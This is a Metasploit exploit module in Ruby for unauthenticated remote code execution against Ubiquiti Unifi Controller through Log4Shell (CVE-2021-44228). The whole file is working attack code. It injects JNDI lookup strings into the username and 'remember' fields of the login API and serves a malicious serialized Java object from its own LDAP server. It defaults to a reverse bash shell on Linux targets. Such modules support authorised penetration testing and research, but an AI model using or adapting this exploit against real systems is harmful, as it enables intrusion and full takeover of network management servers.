##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::JndiInjection
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(_info = {})
    super(
      'Name' => 'Unifi Controller Unauthenticated JNDI Injection RCE (via Log4Shell)',
      'Description' => %q{
        The Unbiquiti Unifi Controller application is affected by the Log4Shell vulnerability whereby a JNDI string can
        be sent to the server that will cause it to connect to the attacker and deserialize a malicious Java object.
        This results in OS command execution.

        This module will start an LDAP server that the target will need to connect to.
      },
      'Author' => [
        'Spencer McIntyre', # this exploit module and JNDI/LDAP lib stuff
        'RageLtMan <rageltman[at]sempervictus>', # JNDI/LDAP lib stuff
        'Nicholas Anastasi' # Unifi research
      ],
      'References' => [
        [ 'CVE', '2021-44228' ],
        [ 'URL', 'https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi' ],
        [ 'URL', 'https://github.com/puzzlepeaches/Log4jUnifi' ]
      ],
      'DisclosureDate' => '2021-12-09',
      'License' => MSF_LICENSE,
      'DefaultOptions' => {
        'RPORT' => 8443,
        'SSL' => true,
        'WfsDelay' => 30
      },
      'Targets' => [
        [
          'Windows', {
            'Platform' => 'win'
          },
        ],
        [
          'Linux', {
            'Platform' => 'unix',
            'Arch' => [ARCH_CMD],
            'DefaultOptions' => {
              'PAYLOAD' => 'cmd/unix/reverse_bash'
            }
          },
        ]
      ],
      'Notes' => {
        'Stability' => [CRASH_SAFE],
        'SideEffects' => [IOC_IN_LOGS],
        'AKA' => ['Log4Shell', 'LogJam'],
        'Reliability' => [REPEATABLE_SESSION]
      }
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'Base path', '/'])
    ])
  end

  def wait_until(&block)
    datastore['WfsDelay'].times do
      break if block.call

      sleep(1)
    end
  end

  def check
    validate_configuration!

    start_service
    trigger

    wait_until { @search_received }
    return Exploit::CheckCode::Unknown unless @search_received

    Exploit::CheckCode::Vulnerable
  ensure
    stop_service
  end

  def build_ldap_search_response_payload
    return [] if @search_received

    @search_received = true

    return [] unless @exploiting

    print_good('Delivering the serialized Java object to execute the payload...')
    build_ldap_search_response_payload_inline('BeanFactory')
  end

  def trigger
    @search_received = false
    # HTTP request initiator
    send_request_raw(
      'uri' => normalize_uri(target_uri, 'api', 'login'),
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => {
        'username' => jndi_string,
        'password' => rand_text_alphanumeric(8..16), # can not be blank!
        'remember' => jndi_string,
        'strict' => true
      }.to_json
    )
  end

  def exploit
    validate_configuration!

    @exploiting = true
    start_service
    trigger

    wait_until { @search_received && (!handler_enabled? || session_created?) }
    handler
  ensure
    cleanup
  end
end
